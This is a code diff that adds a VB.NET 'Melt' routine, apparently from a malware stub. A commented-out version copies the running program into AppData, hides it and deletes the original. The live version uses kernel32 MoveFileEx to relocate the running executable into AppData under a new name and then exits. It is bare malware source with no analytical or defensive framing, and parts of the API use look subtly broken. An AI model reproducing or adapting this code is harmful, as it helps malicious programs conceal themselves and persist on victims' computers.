@@ -1,0 +1,28 @@
+'Shared Sub Melt(ByVal NewName As String)
+ ' Try
+  '  Dim NewFolder As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
+   ' If Application.StartupPath = NewFolder = False Then
+   ' FileCopy(System.Windows.Forms.Application.ExecutablePath, NewFolder & "\" & NewName)
+   ' Shell(NewFolder & "\" & NewName & " " & Application.ExecutablePath)
+   ' Dim Hidden As System.IO.FileAttributes = FileAttributes.Hidden
+   ' IO.File.SetAttributes(NewFolder & "\" & NewName, Hidden)
+   ' End
+   ' Else
+   ' Kill(Microsoft.VisualBasic.Command)
+   ' End If
+ ' Catch
+ ' End Try
+'End Sub
+Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Integer, ByVal lpFileName As String, ByVal nSize As Integer) As Integer
+    Public Declare Function ExitProcess Lib "kernel32" Alias "ExitProcess" (ByVal uExitCode As UInteger) As Integer
+    Public Declare Function MoveFile Lib "kernel32" Alias "MoveFileExW" (<[In](), MarshalAs(UnmanagedType.LPTStr)> ByVal lpExistingFileName As String, <[In](), MarshalAs(UnmanagedType.LPTStr)> ByVal lpNewFileName As String, ByVal dwFlags As Long) As Integer
+Public Shared Sub Melt(ByVal Name As String)
+Dim NewFolder As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
+		If IO.File.Exists(NewFolder & "\" & Name) Then
+			IO.File.Delete(NewFolder & "\" & Name)
+		End If
+        MoveFile(Microsoft.VisualBasic.Left(Application.ExecutablePath, _
+        GetModuleFileName(0, Application.ExecutablePath, 256)), _
+        NewFolder & "\" & Name, 8)
+        ExitProcess(0)
+End Sub
